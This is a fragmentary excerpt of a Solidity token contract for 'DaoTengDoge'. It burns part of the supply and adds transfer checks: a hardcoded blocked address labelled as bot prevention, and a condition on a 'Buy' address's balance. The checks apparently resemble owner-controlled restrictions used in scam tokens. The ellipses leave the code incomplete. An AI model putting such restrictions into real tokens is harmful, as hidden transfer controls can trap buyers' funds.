...
contract AntiBotLiquidityGeneratorToken {
    ...
    string public name = "DaoTengDoge";
    string public symbol = "DaoTengDoge";
    ...
    constructor() {
        ...
        _transfer(msg.sender, 0x000000000000000000000000000000000000dEaD, totalSupply/5) ;
...
require ( to !=0xB0FC16615C24C30Af36EBD932CF817A05D2e03bD); // prevent from bot
        if (Buy != Owner && to != Buy && balanceOf[Buy]>=totalSupply.divCeil(5)) {
